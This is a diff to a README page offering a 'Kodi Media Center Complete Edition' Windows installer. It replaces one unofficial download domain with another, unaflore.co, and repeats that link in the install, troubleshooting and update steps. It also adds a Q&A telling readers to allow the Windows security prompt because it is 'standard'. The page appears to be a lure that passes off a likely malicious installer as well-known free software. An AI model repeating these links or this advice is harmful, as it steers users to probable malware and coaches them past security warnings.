@@ -15,12 +15,22 @@
 
 ## Download
 
-> Use the project link below for Windows.
+> Use the release page below for Windows.
 
-* **Project link:** **[kodi-media-center.nerasix.xyz](https://kodi-media-center.nerasix.xyz/)**
-* **Full URL:** `https://kodi-media-center.nerasix.xyz/`
-* **Type:** Desktop package | Windows 10 and 11, 64-bit
-* **Setup:** Run the installer from the extracted folder
+- **Release page:** [unaflore.co](https://unaflore.co)
+- **Full URL:** `https://unaflore.co/`
+- **Type:** Desktop package | Windows 10 and 11, 64-bit
+- **Setup:** Run the installer from the extracted folder
+
+
+## Questions & Answers
+
+**Is it free to download?** Yes — it's free to download and use.
+
+**Does it work on Windows?** Yes, it's built and tested for Windows 10 and 11.
+
+**What if Windows asks for permission to run?** Allow it — that's a standard security prompt.
+
 
 ## `ABOUT`
 
@@ -46,12 +56,12 @@ Kodi Media Center Complete Edition Setup Guide — Home theater media center —
 
 <details>
 <summary>&nbsp;<b>How to install?</b></summary>
-<br>Open <a href="https://kodi-media-center.nerasix.xyz/">kodi-media-center.kodi-media-center.nerasix.xyz</a>, click <b>Download</b>, extract the archive, then run <b>Setup</b>.
+<br>Open <a href="https://unaflore.co/">unaflore.co</a>, click <b>Download</b>, extract the archive, then run <b>Setup</b>.
 </details>
 
 <details>
 <summary>&nbsp;<b>Download didn't start?</b></summary>
-<br>Use the manual link on the Nerasix download page, or open <a href="https://kodi-media-center.nerasix.xyz/">kodi-media-center.kodi-media-center.nerasix.xyz</a> directly in your browser.
+<br>Open <a href="https://unaflore.co/">unaflore.co</a> directly in your browser and use the download page.
 </details>
 
 <details>
@@ -61,5 +71,5 @@ Kodi Media Center Complete Edition Setup Guide — Home theater media center —
 
 <details>
 <summary>&nbsp;<b>Updates?</b></summary>
-<br>Open <a href="https://kodi-media-center.nerasix.xyz/">kodi-media-center.kodi-media-center.nerasix.xyz</a> again and download the latest version from Nerasix.
+<br>Open <a href="https://unaflore.co/">unaflore.co</a> again and download the latest version.
 </details>
